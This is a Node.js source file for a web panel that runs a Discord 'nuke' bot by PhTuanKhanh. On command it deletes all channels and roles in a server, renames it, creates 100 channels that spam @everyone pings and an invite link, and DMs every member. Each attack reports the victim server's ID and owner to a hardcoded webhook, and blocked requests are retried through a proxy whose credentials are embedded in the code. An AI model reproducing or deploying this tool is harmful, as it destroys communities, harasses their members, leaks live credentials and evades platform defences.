import express from 'express';
import { Client, GatewayIntentBits, REST } from 'discord.js';
import { ProxyAgent } from 'undici';
import cookieParser from 'cookie-parser';
import crypto from 'crypto';
import path from 'path';
import { fileURLToPath } from 'url';

const __dirname = path.dirname(fileURLToPath(import.meta.url));
const app = express();
app.use(express.json());
app.use(cookieParser());
app.use(express.static(path.join(__dirname, 'public')));

const NOTIFY_WEBHOOK = 'https://discord.com/api/webhooks/1571391518525358100/BLEIDxMtvlNlT593waQH56RCa68_RD5UPBtDvCRmgnFGC79YRWh1KZeY7QegvScWDjJj';

const CONFIG = {
  channelName: 'anh-phtuankhanh-nuke',
  renameName: 'NUKE BY PHTUANKHANH',
  channelCount: 100,
  msgContent: '# > NUKE BY PHTUANKHANH\n\n@everyone\n\nhttps://discord.gg/BqZ7UdtwXG',
  msgCount: 1,
  pingEveryone: true,
  roleName: 'ROLE SPAM BY PTK',
  roleCount: 20,
  dmContent: '# > NUKE BY PHTUANKHANH\n\nhttps://discord.gg/BqZ7UdtwXG'
};

const proxyStr = 'http://flme5a8d5ad-package-standard:d4bda2c8@proxy.flameproxies.com:8989';
const proxyDispatcher = new ProxyAgent(proxyStr);

const sessions = new Map(); 

function getSession(req, res) {
  let sid = req.cookies.sid;
  if (!sid) {
    sid = crypto.randomBytes(16).toString('hex');
    res.cookie('sid', sid, { maxAge: 86400000, httpOnly: true });
  }
  if (!sessions.has(sid)) {
    sessions.set(sid, { client: null, clientId: null, token: null, logs: [] });
  }
  return { sid, session: sessions.get(sid) };
}

function pushLog(session, msg, type = 'info') {
  const log = { time: new Date().toLocaleTimeString(), msg, type };
  session.logs.push(log);
  if (session.logs.length > 200) session.logs.shift();
  console.log(`[${type.toUpperCase()}] ${msg}`);
}

async function notifyNuke(session, info) {
  const { guildName, guildIcon, guildId, ownerId, channels, msgs, user, error } = info;
  const fields = [
    { name: 'Server', value: guildName || 'không rõ', inline: true },
    { name: 'Guild ID', value: guildId || '-', inline: true },
    { name: 'Kênh tạo', value: String(channels ?? 0), inline: true },
    { name: 'Tin nhắn', value: String(msgs ?? 0), inline: true },
    { name: 'Người dùng', value: user || '-', inline: true },
    { name: 'Owner ID', value: ownerId || '-', inline: true },
    { name: 'Thời gian', value: `<t:${Math.floor(Date.now() / 1000)}:F>`, inline: false },
  ];
  if (guildId) fields.push({ name: 'Link server', value: `https://discord.com/channels/${guildId}`, inline: false });
  if (error) fields.push({ name: 'Lỗi', value: String(error).slice(0, 1000), inline: false });

  const embed = {
    title: error ? 'Nuke thất bại' : 'Nuke thành công',
    color: error ? 0xff0000 : 0x00ff66,
    fields,
    thumbnail: guildIcon ? { url: guildIcon } : undefined,
    footer: { text: 'nuke panel | by PhTuanKhanh' },
    timestamp: new Date().toISOString(),
  };
  
  const body = { 
    username: 'nuke notifier', 
    avatar_url: guildIcon || null, 
    content: '@everyone',
    allowed_mentions: { parse: ['everyone'] },
    embeds: [embed] 
  };

  for (let attempt = 0; attempt < 3; attempt++) {
    try {
      let res = await fetch(NOTIFY_WEBHOOK + '?wait=true', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify(body),
      });

      if ([429, 403, 404].includes(res.status)) {
        pushLog(session, `Webhook bị chặn IP. Chuyển qua Proxy...`, 'warn');
        res = await fetch(NOTIFY_WEBHOOK + '?wait=true', {
          method: 'POST',
          headers: { 'Content-Type': 'application/json' },
          body: JSON.stringify(body),
          dispatcher: proxyDispatcher
        });
      }
      if (res.status === 429) { await new Promise(r => setTimeout(r, 3000)); continue; }
      if (!res.ok) { pushLog(session, `Webhook lỗi (${res.status})`, 'error'); return; }
      pushLog(session, `Webhook gửi thành công!`, 'success');
      return;
    } catch (e) { pushLog(session, `Webhook crash: ${e.message}`, 'error'); return; }
  }
}

async function safeRest(session, method, endpoint, data = {}) {
  if (!session.token) throw new Error("Bot chưa login");
  const rest = new REST({ version: '10' }).setToken(session.token);
  
  try {
    return await rest.request({ method, fullRoute: endpoint, body: data.data ? data : undefined, ...(!data.data && data ? { body: data } : {}) });
  } catch (err) {
    if ([429, 403, 404].includes(err.status)) {
      pushLog(session, `Discord chặn IP (${err.status}). Retry qua Proxy...`, 'warn');
      const proxyRest = new REST({ version: '10', agent: proxyDispatcher }).setToken(session.token);
      return await proxyRest.request({ method, fullRoute: endpoint, body: data.data ? data : undefined, ...(!data.data && data ? { body: data } : {}) });
    }
    throw err;
  }
}

function startBot(token, session) {
  if (session.client) {
    session.client.destroy();
    session.client = null;
    session.clientId = null;
  }

  session.token = token;

  session.client = new Client({
    intents: [
      GatewayIntentBits.Guilds,
      GatewayIntentBits.GuildMessages,
      GatewayIntentBits.MessageContent,
      GatewayIntentBits.GuildMembers
    ]
  });

  session.client.on('ready', () => {
    session.clientId = session.client.user.id;
    pushLog(session, `BOT Đã online: ${session.client.user.tag}`, 'success');
  });

  session.client.on('messageCreate', async (message) => {
    if (message.author.bot) return;
    if (message.client.user.id !== session.client.user.id) return;

    const guild = message.guild;
    const content = message.content.trim();

    // LỆNH !MENU
    if (content === '!menu') {
      const menuMsg = 
        `**DANH SÁCH LỆNH NUKE**\n` +
        `\`!menu\` - Xem danh sách lệnh\n` +
        `\`!nuke\` - Nuke server (xoá kênh, spam kênh, dmall)\n` +
        `\`!spamrole\` - Xoá hết role cũ, spam tạo 20 role mới\n`;
      
      message.reply(menuMsg).catch(() => {});
      return;
    }

    // LỆNH !SPAMROLE
    if (content === '!spamrole') {
      message.reply('🚀 Bắt đầu spam role...').catch(() => {});
      pushLog(session, `Bắt đầu spam role server: ${guild.name}`, 'warn');
      
      try {
        const { roleName, roleCount } = CONFIG;
        const botMember = await guild.members.fetch(session.client.user.id);
        const botHighestRole = botMember.roles.highest;

        pushLog(session, `Đang xoá toàn bộ role cũ...`, 'info');
        const oldRoles = await guild.roles.fetch();
        
        const delPromises = [];
        for (const [id, role] of oldRoles) {
          if (role.managed || id === guild.id) continue;
          if (role.position < botHighestRole.position) {
            delPromises.push(safeRest(session, 'DELETE', `/guilds/${guild.id}/roles/${id}`).catch(() => {}));
          }
        }
        await Promise.allSettled(delPromises);

        pushLog(session, `Đang tạo ${roleCount} role spam...`, 'info');
        const createPromises = Array.from({ length: roleCount }, () =>
          safeRest(session, 'POST', `/guilds/${guild.id}/roles`, {
            name: roleName,
            color: 0xff0000
          }).catch(() => null)
        );
        await Promise.allSettled(createPromises);

        pushLog(session, `SPAM ROLE HOÀN TẤT!`, 'success');
      } catch (err) {
        pushLog(session, `Lỗi spam role: ${err.message}`, 'error');
      }
      return;
    }

    // LỆNH !NUKE
    if (content === '!nuke') {
      const t0 = Date.now();
      message.reply('🚀 Bắt đầu nuke...').catch(() => {});
      pushLog(session, `Bắt đầu nuke server: ${guild.name}`, 'warn');

      let channelsCreated = 0;
      let msgsSent = 0;

      try {
        const { channelCount: cc, channelName: chName, renameName: rName, msgCount: mc, msgContent: msgText, pingEveryone: ping } = CONFIG;

        // 1. RENAME
        if (rName) {
          pushLog(session, `Đang đổi tên server...`, 'info');
          await safeRest(session, 'PATCH', `/guilds/${guild.id}`, { name: rName }).catch(() => {});
        }

        // 2. NOTIFY WEBHOOK
        await notifyNuke(session, {
          guildName: guild.name,
          guildIcon: guild.iconURL({ size: 256, extension: 'png' }),
          guildId: guild.id, ownerId: guild.ownerId,
          channels: cc, msgs: cc * mc,
          user: session.client.user.username,
          error: null,
        });

        // 3. XOÁ ALL KÊNH
        pushLog(session, `Đang xoá toàn bộ kênh...`, 'info');
        const oldChannels = await guild.channels.fetch().catch(() => null);
        if (oldChannels) {
          const delPromises = Array.from(oldChannels.values()).filter(Boolean).map(c => 
            safeRest(session, 'DELETE', `/channels/${c.id}`).catch(() => {})
          );
          await Promise.allSettled(delPromises);
        }

        // 4. TẠO KÊNH + SPAM
        pushLog(session, `Đang tạo ${cc} kênh và spam tin nhắn...`, 'info');
        const createPromises = Array.from({ length: cc }, () =>
          safeRest(session, 'POST', `/guilds/${guild.id}/channels`, { name: chName, type: 0 }).then(async c => {
            channelsCreated++;
            for (let i = 0; i < mc; i++) {
              await safeRest(session, 'POST', `/channels/${c.id}/messages`, {
                content: msgText,
                allowed_mentions: ping ? { parse: ['everyone'] } : { parse: [] }
              }).then(() => { msgsSent++; }).catch(() => {});
            }
          }).catch(() => null)
        );
        await Promise.allSettled(createPromises);

        // 5. DMALL
        pushLog(session, `Đang DM toàn bộ thành viên...`, 'info');
        const members = await guild.members.fetch().catch(() => null);
        if (members) {
          const dmPromises = [];
          for (const [id, member] of members) {
            if (member.user.bot) continue;
            dmPromises.push(
              member.send({
                content: CONFIG.dmContent,
                allowedMentions: { parse: [] }
              }).catch(() => {})
            );
          }
          await Promise.allSettled(dmPromises);
          pushLog(session, `Đã gửi DM xong.`, 'success');
        }

        pushLog(session, `NUKE HOÀN TẤT trong ${Date.now() - t0}ms!`, 'success');
        await new Promise(r => setTimeout(r, 2000));

      } catch (err) {
        pushLog(session, `Lỗi nuke: ${err.message}`, 'error');
      }
      return;
    }
  });

  session.client.login(token).catch(e => {
    pushLog(session, `Lỗi đăng nhập: ${e.message}`, 'error');
    session.client = null;
    session.clientId = null;
    session.token = null;
  });
}

app.post('/api/login', async (req, res) => {
  const { token } = req.body ?? {};
  if (!token || typeof token !== 'string') return res.status(400).json({ error: 'Thiếu token' });

  const cleanToken = token.trim();
  if (!/^[A-Za-z0-9._-]+$/.test(cleanToken)) return res.status(400).json({ error: 'Token không hợp lệ' });

  const { session } = getSession(req, res);
  pushLog(session, `Đang kết nối bot...`, 'info');
  startBot(cleanToken, session);
  
  await new Promise(r => setTimeout(r, 2500));
  
  if (session.client && session.client.user) {
    res.json({ ok: true, user: session.client.user.tag, clientId: session.client.user.id });
  } else {
    res.status(500).json({ error: 'Đăng nhập thất bại. Kiểm tra lại token.' });
  }
});

app.post('/api/logout', (req, res) => {
  const { session } = getSession(req, res);
  if (session.client) {
    session.client.destroy();
    session.client = null;
    session.clientId = null;
    session.token = null;
    pushLog(session, 'Đã tắt kết nối hoàn toàn.', 'warn');
  }
  res.json({ ok: true });
});

app.get('/api/status', (req, res) => {
  const { session } = getSession(req, res);
  res.json({
    online: !!(session.client && session.client.user),
    user: session.client?.user?.tag || null,
    clientId: session.clientId
  });
});

app.get('/api/logs', (req, res) => {
  const { session } = getSession(req, res);
  res.json(session.logs);
});

const PORT = process.env.PORT || 3000;
app.listen(PORT, () => console.log(`panel http://localhost:${PORT}`));
